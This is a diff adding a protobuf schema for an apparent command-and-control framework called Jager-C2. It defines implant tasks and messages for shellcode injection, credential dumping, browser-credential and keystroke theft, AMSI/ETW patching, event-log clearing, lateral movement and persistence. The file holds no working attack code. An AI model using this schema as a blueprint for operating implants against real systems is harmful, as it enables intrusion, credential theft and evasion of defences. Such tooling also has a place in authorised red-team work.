@@ -1,0 +1,339 @@
+syntax = "proto3";
+
+package jager;
+
+option go_package = "github.com/0xhackerfren/Jager-C2/teamserver/proto/jagerpb";
+
+import "google/protobuf/timestamp.proto";
+import "common.proto";
+
+// Task types map to implant command handlers
+enum TaskType {
+  TASK_UNKNOWN = 0;
+
+  // Core
+  TASK_SLEEP = 1;
+  TASK_EXIT = 2;
+  TASK_SELF_DELETE = 3;
+
+  // Execution
+  TASK_SHELL = 10;
+  TASK_POWERSHELL = 11;
+  TASK_EXECUTE = 12;
+  TASK_EXECUTE_ASSEMBLY = 13;
+  TASK_BOF = 14;
+  TASK_SHELLCODE = 15;
+  TASK_INLINE_EXECUTE = 16;
+
+  // Filesystem
+  TASK_LS = 20;
+  TASK_CD = 21;
+  TASK_PWD = 22;
+  TASK_CAT = 23;
+  TASK_UPLOAD = 24;
+  TASK_DOWNLOAD = 25;
+  TASK_RM = 26;
+  TASK_MKDIR = 27;
+  TASK_CP = 28;
+  TASK_MV = 29;
+  TASK_TIMESTOMP = 30;
+
+  // Process
+  TASK_PS = 40;
+  TASK_KILL_PROCESS = 41;
+  TASK_SPAWN = 42;
+  TASK_INJECT = 43;
+  TASK_MIGRATE = 44;
+
+  // Network
+  TASK_IFCONFIG = 50;
+  TASK_NETSTAT = 51;
+  TASK_PORTSCAN = 52;
+  TASK_SOCKS_START = 53;
+  TASK_SOCKS_STOP = 54;
+  TASK_PORTFWD_ADD = 55;
+  TASK_PORTFWD_RM = 56;
+
+  // Credential
+  TASK_TOKEN_STEAL = 60;
+  TASK_MAKE_TOKEN = 61;
+  TASK_REVERT_TOKEN = 62;
+  TASK_HASHDUMP = 63;
+  TASK_KERBEROS_TICKETS = 64;
+  TASK_DPAPI = 65;
+  TASK_LOGON_USER = 66;
+
+  // Evasion
+  TASK_SLEEP_MASK = 70;
+  TASK_UNHOOK = 71;
+  TASK_PATCH_ETW = 72;
+  TASK_PATCH_AMSI = 73;
+  TASK_MODULE_STOMP = 74;
+  TASK_THREADLESS_INJECT = 75;
+
+  // Lateral movement
+  TASK_LATERAL_PSEXEC = 80;
+  TASK_LATERAL_WMI = 81;
+  TASK_LATERAL_DCOM = 82;
+  TASK_LATERAL_WINRM = 83;
+  TASK_LATERAL_SCHTASK = 84;
+
+  // Persistence
+  TASK_PERSIST_REGISTRY = 90;
+  TASK_PERSIST_SERVICE = 91;
+  TASK_PERSIST_SCHTASK = 92;
+  TASK_PERSIST_COM = 93;
+  TASK_PERSIST_DLL_SIDELOAD = 94;
+
+  // Collection
+  TASK_SCREENSHOT = 100;
+  TASK_KEYLOG_START = 101;
+  TASK_KEYLOG_STOP = 102;
+  TASK_CLIPBOARD = 103;
+  TASK_BROWSER_CREDS = 104;
+
+  // Pivoting
+  TASK_P2P_LISTEN = 110;
+  TASK_P2P_CONNECT = 111;
+  TASK_P2P_RELAY = 112;
+
+  // Defense evasion (extended)
+  TASK_DEFENSE_CLEAR_EVENTLOG = 113;
+  TASK_ARP_SCAN = 114;
+
+  // Reverse port forwarding
+  TASK_RPORTFWD_ADD = 115;
+  TASK_RPORTFWD_REMOVE = 116;
+}
+
+// Task state
+enum TaskState {
+  TASK_STATE_QUEUED = 0;
+  TASK_STATE_SENT = 1;
+  TASK_STATE_RUNNING = 2;
+  TASK_STATE_COMPLETED = 3;
+  TASK_STATE_FAILED = 4;
+  TASK_STATE_CANCELLED = 5;
+}
+
+// A task queued for an implant
+message Task {
+  string id = 1;
+  string session_id = 2;
+  TaskType type = 3;
+  TaskState state = 4;
+  bytes request_data = 5;
+  bytes response_data = 6;
+  google.protobuf.Timestamp created_at = 7;
+  google.protobuf.Timestamp sent_at = 8;
+  google.protobuf.Timestamp completed_at = 9;
+  string error = 10;
+  Operator created_by = 11;
+}
+
+// Task-specific request payloads (serialized into Task.request_data)
+
+message ShellRequest {
+  string command = 1;
+  string shell = 2;  // cmd.exe, /bin/sh, powershell.exe
+  uint32 timeout_seconds = 3;
+}
+
+message ExecuteRequest {
+  string path = 1;
+  repeated string args = 2;
+  bool hidden = 3;
+  uint32 timeout_seconds = 4;
+}
+
+message ExecuteAssemblyRequest {
+  bytes assembly = 1;
+  repeated string args = 2;
+  string app_domain = 3;
+  bool etw_bypass = 4;
+  bool amsi_bypass = 5;
+}
+
+message BOFRequest {
+  bytes object_file = 1;
+  bytes arguments = 2;  // Packed BOF arguments (BeaconDataParse format)
+  string entry_point = 3;
+}
+
+message ShellcodeRequest {
+  bytes shellcode = 1;
+  uint32 target_pid = 2;  // 0 = self-inject
+  string injection_technique = 3;
+  bool rwx = 4;
+}
+
+message InjectRequest {
+  bytes payload = 1;
+  uint32 target_pid = 2;
+  string technique = 3;  // earlybird, apc, threadpool, module_stomp
+}
+
+message UploadRequest {
+  string remote_path = 1;
+  bytes data = 2;
+}
+
+message DownloadRequest {
+  string remote_path = 1;
+}
+
+message LsRequest {
+  string path = 1;
+}
+
+message PortscanRequest {
+  repeated string targets = 1;
+  repeated uint32 ports = 2;
+  uint32 timeout_ms = 3;
+  uint32 threads = 4;
+}
+
+message SocksRequest {
+  uint32 port = 1;
+}
+
+message PortfwdRequest {
+  uint32 local_port = 1;
+  string remote_host = 2;
+  uint32 remote_port = 3;
+  bool reverse = 4;
+}
+
+message TokenStealRequest {
+  uint32 target_pid = 1;
+}
+
+message MakeTokenRequest {
+  string domain = 1;
+  string username = 2;
+  string password = 3;
+}
+
+message LateralRequest {
+  string target_host = 1;
+  bytes payload = 2;
+  string service_name = 3;
+  string username = 4;
+  string password = 5;
+  string hash = 6;
+}
+
+message PersistRequest {
+  string name = 1;
+  string path = 2;
+  bytes payload = 3;
+  string registry_key = 4;
+  string registry_value = 5;
+}
+
+message P2PRequest {
+  string pipe_name = 1;
+  string target_host = 2;
+}
+
+// TunnelFrame carries bidirectional data over the C2 channel for
+// SOCKS relay and reverse port forwarding.
+message TunnelFrame {
+  uint32 channel_id = 1;
+  enum Op {
+    OPEN = 0;
+    DATA = 1;
+    CLOSE = 2;
+  }
+  Op op = 2;
+  bytes payload = 3;
+  string target_host = 4;
+  uint32 target_port = 5;
+  string session_id = 6;
+}
+
+// Task result payloads (serialized into Task.response_data)
+
+message ShellResponse {
+  string stdout = 1;
+  string stderr = 2;
+  int32 exit_code = 3;
+}
+
+message LsResponse {
+  string path = 1;
+  repeated FileEntry entries = 2;
+}
+
+message FileEntry {
+  string name = 1;
+  int64 size = 2;
+  bool is_dir = 3;
+  google.protobuf.Timestamp modified = 4;
+  string permissions = 5;
+  string owner = 6;
+}
+
+message PsResponse {
+  repeated ProcessInfo processes = 1;
+}
+
+message NetstatResponse {
+  repeated NetConn connections = 1;
+}
+
+message PortscanResponse {
+  repeated PortscanResult results = 1;
+}
+
+message PortscanResult {
+  string host = 1;
+  uint32 port = 2;
+  bool open = 3;
+  string banner = 4;
+}
+
+message ScreenshotResponse {
+  bytes data = 1;
+  string format = 2;
+  uint32 width = 3;
+  uint32 height = 4;
+}
+
+message CredentialResult {
+  string source = 1;
+  string domain = 2;
+  string username = 3;
+  string credential_type = 4;  // ntlm, cleartext, aes256, kerberos_ticket
+  string credential_data = 5;
+}
+
+// Task management requests
+message TaskRequest {
+  Request request = 1;
+  string session_id = 2;
+  TaskType type = 3;
+  bytes data = 4;
+}
+
+message TasksListRequest {
+  Request request = 1;
+  string session_id = 2;
+  TaskState filter_state = 3;
+  uint32 limit = 4;
+}
+
+message TaskCancelRequest {
+  Request request = 1;
+  string task_id = 2;
+}
+
+// Task management responses
+message TaskResponse {
+  Task task = 1;
+  Status status = 2;
+}
+
+message TasksListResponse {
+  repeated Task tasks = 1;
+}
